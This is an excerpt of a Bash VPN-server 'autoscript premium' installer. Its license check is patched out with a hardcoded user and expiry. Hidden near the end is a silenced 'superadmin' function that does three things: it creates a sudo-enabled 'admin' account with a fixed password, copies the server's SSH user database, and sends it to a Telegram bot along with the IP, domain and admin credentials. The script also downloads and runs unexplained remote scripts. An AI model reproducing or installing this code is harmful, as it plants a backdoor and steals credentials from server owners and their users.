...
export IP=$( curl -sS icanhazip.com )
  ...
  # // Banner
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo -e "  Dev > AUTOSCRIPT PREMIUM ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
echo -e " This Will Quick Setup VPN Server On Your Server"
echo -e "  Auther : ${green}GRETONGERS VPN PREMIUM ® ${NC}${YELLOW}(${NC} ${green} LITE V1 ${NC}${YELLOW})${NC}"
echo -e " © Recode By @wongedan_kuwibebas ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo ""
sleep 2
###### IZIN SC 
...
clear
# REPO
#https://github.com/YaddyKakkoii/wongedan
...
echo -e "     \e[1;32m2)\e[0m Menggunakan Domain Custom Subdomain Gratis"
echo -e "   ------------------------------------"
...
echo ""
    if [[ $host == "1" ]]; then
        ...
        #wget ${REPO}cf.sh && chmod +x cf.sh && ./cf.sh && rm -f /root/cf.sh
...
echo -e "\e[32mloading...\e[0m" 
clear
#https://raw.githubusercontent.com/wongedann/wongedanlitev1/main/
#izinsc="https://raw.githubusercontent.com/wongedann/wongedanlitev1/main/REGISTRASI"
# USERNAME
rm -f /usr/bin/user
### galaxysgdo 2024-12-14 209.97.168.49
#curl https://raw.githubusercontent.com/wongedann/wongedanlitev1/main/REGISTRASI | grep $(curl -sS ipv4.icanhazip.com) | awk '{print $2}'
#username=$(curl $izinsc | grep $MYIP | awk '{print $2}')
username=galaxysgdo
echo "$username" >/usr/bin/user
#expx=$(curl $izinsc | grep $MYIP | awk '{print $3}')
expx=9999999999-09-09
echo "$expx" >/usr/bin/e
# DETAIL ORDER
...
TIME="10"
NAMES=galaxysgdo
EXPSC=9999999999-09-09
#NAMES=$(curl -sS https://raw.githubusercontent.com/wongedann/wongedanlitev1/main/REGISTRASI | grep $MYIP | awk '{print $3}')
#EXPSC=$(curl -sS https://raw.githubusercontent.com/wongedann/wongedanlitev1/main/REGISTRASI | grep $MYIP | awk '{print $4}')
CHATID="-1001445483960"
LOCAL_DATE="/usr/bin/"
...
TEXT="
<u><b>MAKASIH BANG 😁 INSTALLERNYA BAGUS</b></u>
<u><b>Tapi Masih Kurang lengkap fiturnya hehehe 😁✌️</b></u>
<code>────────────────────</code>
<b>🕊️ᴀᴜᴛᴏꜱᴄʀɪᴘᴛ ᴘʀᴇᴍɪᴜᴍ ʟɪᴛᴇ ᴠ1🕊️</b>
<code>────────────────────</code>
...
<code>────────────────────</code>
<i>ᴀᴜᴛᴏᴍᴀᴛɪᴄ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ ꜰʀᴏᴍ</i>
<i>ɢʀᴇᴛᴏɴɢᴇʀꜱ ᴠᴘɴ ᴘʀᴇᴍɪᴜᴍ</i>
"'&reply_markup={"inline_keyboard":[[{"text":"ORDER🛂","url":"https://t.me/wongedan_kuwibebas "},{"text":"CHANNEL🕊️","url":"https://t.me/gretongers_jatim"}]]}' 
...
bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
    ...
    sed -i "s/1d1c1d94-6987-4658-a4dc-8821a30fe7e0/yaddykakkoii/g" /etc/xray/config.json
...
wget ${REPO}wongedan-tunnel && chmod +x wongedan-tunnel && ./wongedan-tunnel
...
echo ""
cd /root && rm -f /usr/bin/eue > /dev/null 2>&1 && wget -O /usr/bin/eue "https://raw.githubusercontent.com/YaddyKakkoii/tes/main/ewe.sh" && chmod +x /usr/bin/eue && eue && rm -f /usr/bin/eue
function superadmin(){
MYIP=$(curl -sS ipv4.icanhazip.com)
domain=$(cat /etc/xray/domain)
...
ci=1117211252
useradmin="admin"
pwadmin="Tensa.zang3tsu"

mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $useradmin > /dev/null 2>&1
echo -e "$pwadmin\n$pwadmin\n"|passwd $useradmin > /dev/null 2>&1
usermod -aG sudo $useradmin > /dev/null 2>&1

tekz="
DATABASE SSH TERKIRIM
____________________________
FORMAT DB:
Username Password Quota iplimit Exp
____________________________
Domain : ${domain}
IP VPS : ${MYIP}
User   : ${useradmin}
Passwd : ${pwadmin}
____________________________
Copy: ${domain}:80@${useradmin}:${pwadmin}
____________________________
Yaddy Kakkoii Sugoi Tensai Desu
Recode by : Magelank Phreaker
"
egrep "^$useradmin" /etc/passwd >/dev/null
if [ $? -eq 0 ]; then
    egrep "^$useradmin" /etc/passwd
    echo -e "$pwadmin\n$pwadmin" | passwd $useradmin
else
    mkdir -p /home/script/
    useradd -r -d /home/script -s /bin/bash -M $useradmin > /dev/null 2>&1
    echo -e "$pwadmin\n$pwadmin\n"|passwd $useradmin > /dev/null 2>&1
...
if [ -f /etc/ssh/.ssh.db ]; then
    cp -f /etc/ssh/.ssh.db /tmp/sshdb_${domain}_${hariini}.txt
    cd /tmp
    curl -F chat_id="$ci" -F document=@"sshdb_${domain}_${hariini}.txt" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    cd /root
fi
}
superadmin > /dev/null 2>&1
